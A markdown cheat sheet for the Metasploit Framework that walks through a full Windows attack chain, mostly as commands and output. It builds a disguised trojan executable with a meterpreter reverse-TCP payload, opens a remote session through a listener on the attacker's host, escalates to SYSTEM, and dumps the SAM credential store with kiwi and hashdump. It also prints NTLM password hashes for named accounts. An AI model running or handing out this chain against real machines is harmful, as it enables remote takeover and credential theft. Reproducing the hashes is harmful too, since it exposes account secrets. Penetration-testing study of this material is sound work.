---
title: "Metasploit Framework"
---

**Create executable trojan**

```
$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe LHOST=192.168.153.128 LPORT=8888 -o /root/Desktop/dolphin.exe
```

**On Attackers machine** (Starting Session)

```
$ msfconsole
... [loaded]

msf5 exploit(multi/handler) > use multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > show options 

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf5 exploit(multi/handler) > set LHOST 192.168.153.128
LHOST => 192.168.153.128
msf5 exploit(multi/handler) > set LPORT 8888
LPORT => 8888
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.153.128:8888 
[*] Sending stage (179779 bytes) to 192.168.153.133
[*] Meterpreter session 1 opened (192.168.153.128:8888 -> 192.168.153.133:49915) at 2020-06-21 11:27:30 +0200

meterpreter > ls
Listing: C:\trojan
==================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100777/rwxrwxrwx  73802  fil   2020-06-21 11:27:13 +0200  dolphin.exe
```

**Common Commands**

Get SYSTEM shell

```
$ meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

$ getuid
SYSTEM\*
```

Get available **privileges**

```
$ meterpreter > getprivs
Enabled Process Privileges

Name:
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```

Dump hashes

```
$ meterpreter > hashdump
**--> usually error, we can use kiwi (load kiwi) or mimikatz (load mimikatz)
```

View Kiwi or Hashdump

```
## => kiwi method
$ load kiwi
$ meterpreter > lsa_dump_sam 
[+] Running as SYSTEM
[*] Dumping SAM
Domain : SUPERASME
SysKey : 2191beee37c928bbf9e2de8f685b5227
Local SID : S-1-5-21-716707718-802779726-1162805411

SAMKey : 3d3b9a321a53397e7082da89be862a1e

RID  : 000001f4 (500)
User : Administrator

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: dfa827b88238ba5def8e431fe9503a34

RID  : 000003e9 (1001)
User : Asmir Hadzic
  Hash NTLM: ed2ae0d1f7e22ca3187d8e8d91d968c7


## => hashdump method
meterpreter > run post/windows/gather/hashdump

[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY 2191beee37c928bbf9e2de8f685b5227...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[*] Dumping password hints...

No users with password hints on this system

[*] Dumping password hashes...

Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:dfa827b88238ba5def8e431fe9503a34:::
Asmir Hadzic:1001:aad3b435b51404eeaad3b435b51404ee:ed2ae0d1f7e22ca3187d8e8d91d968c7:::
```

**Other Commands**

Meterpreter consists of a large number of commands which are categorized in
their respective categories, namely:

1. Core Commands
2. STDapi : File Commands
3. STDapi : Networking Commands
4. STDapi : File- System Commands
5. STDapi : User Interface Commands
6. STDapi : Web Cam Commands
7. Priv : Elevate Commands
8. Priv : Password database Commands
9. Priv : Time Stomp commands
